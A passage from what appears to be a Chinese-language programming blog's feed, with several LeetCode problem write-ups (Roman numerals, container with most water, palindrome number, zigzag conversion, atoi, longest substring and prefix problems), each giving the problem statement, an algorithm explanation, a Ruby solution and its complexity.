&apos;C&apos; =&gt; 100, &apos;D&apos; =&gt; 500, &apos;M&apos; =&gt; 1000 &#125;</span><br></pre></td></tr></table></figure></p><p>遍历给定罗马数，要判断两种情况：</p><ul><li>当前值比前一个值大，那就先减去前一个值，再加上当前值与前一个值的差；</li><li>当前值小于等于前一个值，直接加上当前值。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">roman_to_int</span><span class="params">(s)</span></span></span><br><span class="line">  t = &#123; <span class="string">'I'</span> =&gt; <span class="number">1</span>, <span class="string">'V'</span> =&gt; <span class="number">5</span>, <span class="string">'X'</span> =&gt; <span class="number">10</span>, <span class="string">'L'</span> =&gt; <span class="number">50</span>, <span class="string">'C'</span> =&gt; <span class="number">100</span>, <span class="string">'D'</span> =&gt; <span class="number">500</span>, <span class="string">'M'</span> =&gt; <span class="number">1000</span> &#125;</span><br><span class="line">  total = t[s[<span class="number">0</span>]]</span><br><span class="line">  i = <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; s.length</span><br><span class="line">    cur = t[s[i]]</span><br><span class="line">    pre = t[s[i - <span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">if</span> cur &gt; pre</span><br><span class="line">      total = total - pre + cur - pre</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      total += cur</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  total</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code>，n为罗马数字的长度</li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Container With Most Water</title>
      <link href="/2018/03/04/Container-With-Moster-Water/"/>
      <url>/2018/03/04/Container-With-Moster-Water/</url>
      <content type="html"><![CDATA[<h1 id="11-Container-With-Most-Water"><a href="#11-Container-With-Most-Water" class="headerlink" title="11. Container With Most Water"></a>11. Container With Most Water</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given n non-negative integers a1, a2, …, an , where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.</p><p>Note: You may not slant the container and n is at least 2.</p><p><img src="https://s3-lc-upload.s3.amazonaws.com/uploads/2018/07/17/question_11.jpg" alt="question_11"></p><p>The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,8,6,2,5,4,8,3,7]</span><br><span class="line">Output: 49</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>用左右两个指针分别指向首和尾，用较矮的高度乘以宽度，得到容量，判断是否比之前的大。</p><p>指针移动有两种情况：</p><ul><li>左指针对应的高度较矮，就把左指针右移；</li><li>右指针对应的高度较矮，就把右指针左移。</li></ul><p>就这样循环，直到两个指针相遇。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; height</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">max_area</span><span class="params">(height)</span></span></span><br><span class="line">  max, left, right = <span class="number">0</span>, <span class="number">0</span>, height.length - <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> left &lt; right</span><br><span class="line">    max = [max, [height[left], height[right]].min * (right - left)].max</span><br><span class="line">    <span class="keyword">if</span> height[left] &lt; height[right]</span><br><span class="line">      left += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      right -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> max</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：O(n)</li><li>空间复杂度：O(1)</li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Palindrome Number</title>
      <link href="/2018/03/03/Palindrome-Number/"/>
      <url>/2018/03/03/Palindrome-Number/</url>
      <content type="html"><![CDATA[<h1 id="9-Palindrome-Number"><a href="#9-Palindrome-Number" class="headerlink" title="9. Palindrome Number"></a>9. Palindrome Number</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Determine whether an integer is a palindrome. An integer is a palindrome when it reads the same backward as forward.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 121</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: -121</span><br><span class="line">Output: false</span><br><span class="line">Explanation: From left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome.</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 10</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Reads 01 from right to left. Therefore it is not a palindrome.</span><br></pre></td></tr></table></figure></p><p>Follow up:</p><p>Coud you solve it without converting the integer to a string?</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>思路是把给的数分成两半，判断两半是否相等。会有两种情况：</p><ul><li>数字位数是偶数，判断两部分是否相等</li><li>数字位数是奇数，将数值大的一半除以10后比较</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Boolean&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span><span class="params">(x)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> (x % <span class="number">10</span> == <span class="number">0</span> <span class="keyword">and</span> x != <span class="number">0</span>)</span><br><span class="line">  r = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> x &gt; r</span><br><span class="line">    x, mod = x.divmod(<span class="number">10</span>)</span><br><span class="line">    r = r * <span class="number">10</span> + mod</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  x == r <span class="keyword">or</span> x == r / <span class="number">10</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：O(n)，n是数字的位数</li><li>空间复杂度：O(1)</li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ZigZag Conversion</title>
      <link href="/2018/03/02/ZigZag-Conversion/"/>
      <url>/2018/03/02/ZigZag-Conversion/</url>
      <content type="html"><![CDATA[<h1 id="6-ZigZag-Conversion"><a href="#6-ZigZag-Conversion" class="headerlink" title="6. ZigZag Conversion"></a>6. ZigZag Conversion</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The string <code>&quot;PAYPALISHIRING&quot;</code> is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure></p><p>And then read line by line: <code>&quot;PAHNAPLSIIGYIR&quot;</code></p><p>Write the code that will take a string and make this conversion given a number of rows:</p><p>string convert(string s, int numRows);<br>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">Output: &quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">Output: &quot;PINALSIGYAHRPI&quot;</span><br><span class="line">Explanation:</span><br><span class="line"></span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>我们先看一个具体的例子来找规律：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">Explanation:</span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure></p><p>我们把每个字符换成它所在行的坐标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0     0    0</span><br><span class="line">1   1 1  1 1</span><br><span class="line">2 2   2 2</span><br><span class="line">3     3</span><br></pre></td></tr></table></figure></p><p>恢复成原始的样子：<code>01232101232101</code>，规律很明显了。所以我们把每个字母放到对应的行上，最后把每行合并即可。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; num_rows</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(s, num_rows)</span></span></span><br><span class="line">  <span class="keyword">return</span> s <span class="keyword">if</span> num_rows == <span class="number">1</span> <span class="params">||</span> num_rows &gt;= s.length</span><br><span class="line">  characters = Array.new(num_rows) &#123; <span class="string">''</span> &#125;</span><br><span class="line">  index, step = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">  s.chars.each <span class="keyword">do</span> <span class="params">|character|</span></span><br><span class="line">    characters[index] += character</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">0</span></span><br><span class="line">      step = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elsif</span> index == num_rows - <span class="number">1</span></span><br><span class="line">      step = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    index += step</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  characters.join</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>String to Integer (atoi)</title>
      <link href="/2018/03/02/String-to-Integer-atoi/"/>
      <url>/2018/03/02/String-to-Integer-atoi/</url>
      <content type="html"><![CDATA[<h1 id="8-String-to-Integer-atoi"><a href="#8-String-to-Integer-atoi" class="headerlink" title="8. String to Integer (atoi)"></a>8. String to Integer (atoi)</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Implement atoi which converts a string to an integer.</p><p>The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.</p><p>The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.</p><p>If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.</p><p>If no valid conversion could be performed, a zero value is returned.</p><p>Note:</p><ul><li>Only the space character ‘ ‘ is considered as whitespace character.</li><li>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−231,  231 − 1]. If the numerical value is out of the range of representable values, INT_MAX (231 − 1) or INT_MIN (−231) is returned.</li></ul><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;42&quot;</span><br><span class="line">Output: 42</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;   -42&quot;</span><br><span class="line">Output: -42</span><br><span class="line">Explanation: The first non-whitespace character is &apos;-&apos;, which is the minus sign.</span><br><span class="line">             Then take as many numerical digits as possible, which gets 42.</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;4193 with words&quot;</span><br><span class="line">Output: 4193</span><br><span class="line">Explanation: Conversion stops at digit &apos;3&apos; as the next character is not a numerical digit.</span><br></pre></td></tr></table></figure></p><p>Example 4:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;words and 987&quot;</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: The first non-whitespace character is &apos;w&apos;, which is not a numerical </span><br><span class="line">             digit or a +/- sign. Therefore no valid conversion could be performed.</span><br></pre></td></tr></table></figure></p><p>Example 5:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;-91283472332&quot;</span><br><span class="line">Output: -2147483648</span><br><span class="line">Explanation: The number &quot;-91283472332&quot; is out of the range of a 32-bit signed integer.</span><br><span class="line">             Thefore INT_MIN (−231) is returned.</span><br></pre></td></tr></table></figure></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>大体上分为三个步骤：</p><ul><li>先判断正负号，并去掉空格之类的字符</li><li>将字符串按字节遍历，把每个字节对应的数字算出来，并把总数乘10加上这个数</li><li>最后要判断是否溢出</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; str</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_atoi</span><span class="params">(str)</span></span></span><br><span class="line">  str.strip!</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> str.<span class="literal">nil</span>? <span class="keyword">or</span> str.length == <span class="number">0</span></span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> str[<span class="number">0</span>] == <span class="string">"-"</span></span><br><span class="line">    cs, s = str[<span class="number">1</span>..-<span class="number">1</span>], -<span class="number">1</span></span><br><span class="line">  <span class="keyword">elsif</span> str[<span class="number">0</span>] == <span class="string">"+"</span></span><br><span class="line">    cs, s = str[<span class="number">1</span>..-<span class="number">1</span>], <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    cs, s = str, <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> cs.<span class="literal">nil</span>?</span><br><span class="line">  cs.each_byte <span class="keyword">do</span> <span class="params">|b|</span></span><br><span class="line">    <span class="keyword">if</span> b &gt;= <span class="number">48</span> <span class="keyword">and</span> b &lt;= <span class="number">57</span></span><br><span class="line">      i = i * <span class="number">10</span> + (b - <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  i = s * i</span><br><span class="line">  <span class="keyword">if</span> i &lt; -<span class="number">2147483648</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">2147483648</span></span><br><span class="line">  <span class="keyword">elsif</span> i &gt; <span class="number">2147483647</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2147483647</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Longest Series</title>
      <link href="/2018/02/24/Longest-Series/"/>
      <url>/2018/02/24/Longest-Series/</url>
      <content type="html"><![CDATA[<h1 id="Longest-Series"><a href="#Longest-Series" class="headerlink" title="Longest Series"></a>Longest Series</h1><h2 id="3-Longest-Substring-Without-Repeating-Characters"><a href="#3-Longest-Substring-Without-Repeating-Characters" class="headerlink" title="3. Longest Substring Without Repeating Characters"></a>3. Longest Substring Without Repeating Characters</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a string, find the length of the longest substring without repeating characters.</p><p>Examples:</p><p>Given “abcabcbb”, the answer is “abc”, which the length is 3.</p><p>Given “bbbbb”, the answer is “b”, with the length of 1.</p><p>Given “pwwkew”, the answer is “wke”, with the length of 3. Note that the answer must be a substring, “pwke” is a subsequence and not a substring.</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>计算没有重复字母的最长子串。把遍历过的字母都存入hash中，value就是它们的索引值。</p><p>在后面的遍历中如果遇到hash中存在的字符，说明子串已经找出来了，计算长度，并判断是否比存的最大值大。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">length_of_longest_substring</span><span class="params">(s)</span></span></span><br><span class="line">  max = <span class="number">0</span></span><br><span class="line">  start = <span class="number">0</span></span><br><span class="line">  hash = Hash.new(-<span class="number">1</span>)</span><br><span class="line">  s.chars.each_with_index <span class="keyword">do</span> <span class="params">|char, i|</span></span><br><span class="line">    start = start &gt; hash[char] + <span class="number">1</span> ? start : hash[char] + <span class="number">1</span></span><br><span class="line">    hash[char] = i</span><br><span class="line">    max = max &gt; i - start + <span class="number">1</span> ? max : i - start + <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  max</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="5-Longest-Palindromic-Substring"><a href="#5-Longest-Palindromic-Substring" class="headerlink" title="5. Longest Palindromic Substring"></a>5. Longest Palindromic Substring</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;cbbd&quot;</span><br><span class="line">Output: &quot;bb&quot;</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>以每个元素为中心点，往左右两侧找回文串。</p><p>要考虑奇数回文串和偶数回文串，所以中心点分1个和2个两种情况。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_palindrome</span><span class="params">(s, left, right)</span></span></span><br><span class="line">  n = s.length</span><br><span class="line">  <span class="keyword">while</span> (left &gt;= <span class="number">0</span> &amp;&amp; right &lt;= n-<span class="number">1</span> &amp;&amp; s[left] == s[right])</span><br><span class="line">    left -= <span class="number">1</span></span><br><span class="line">    right += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  s[(left + <span class="number">1</span>)..(right - <span class="number">1</span>)]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longest_palindrome</span><span class="params">(s)</span></span></span><br><span class="line">  i, n = <span class="number">0</span>, s.length</span><br><span class="line">  <span class="keyword">return</span> s <span class="keyword">if</span> n &lt;= <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  longest = <span class="string">""</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; n - <span class="number">1</span></span><br><span class="line">    str = find_palindrome(s, i, i)</span><br><span class="line">    longest = str <span class="keyword">if</span> str.length &gt; longest.length</span><br><span class="line">    str = find_palindrome(s, i, i + <span class="number">1</span>)</span><br><span class="line">    longest = str <span class="keyword">if</span> str.length &gt; longest.length</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  longest</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n^2)</code></li><li>空间复杂度：<code>O(n)</code></li></ul><h2 id="14-Longest-Common-Prefix"><a href="#14-Longest-Common-Prefix" class="headerlink" title="14. Longest Common Prefix"></a>14. Longest Common Prefix</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>Write a function to find the longest common prefix string amongst an array of strings.</p><p>If there is no common prefix, return an empty string “”.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">Output: &quot;fl&quot;</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">Output: &quot;&quot;</span><br><span class="line">Explanation: There is no common prefix among the input strings.</span><br></pre></td></tr></table></figure></p><p>Note:</p><p>All given inputs are in lowercase letters a-z.</p><h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p>从数组中找出长度最短的字符串，假设最短字符串就是最长前缀，把数组遍历一遍，查看是否满足。</p><p>不满足就把最短字符串去掉最后一个字符，继续遍历，直到找到满足情况的子串。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String[]&#125; strs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;String&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longest_common_prefix</span><span class="params">(strs)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">""</span> <span class="keyword">if</span> strs.length == <span class="number">0</span></span><br><span class="line">  min_size = <span class="number">10000</span></span><br><span class="line">  min_index = -<span class="number">1</span></span><br><span class="line">  strs.each_with_index <span class="keyword">do</span> <span class="params">|str, index|</span></span><br><span class="line">    <span class="keyword">if</span> str.length &lt; min_size</span><br><span class="line">      min_size = str.length</span><br><span class="line">      min_index = index</span><br><span class="line">    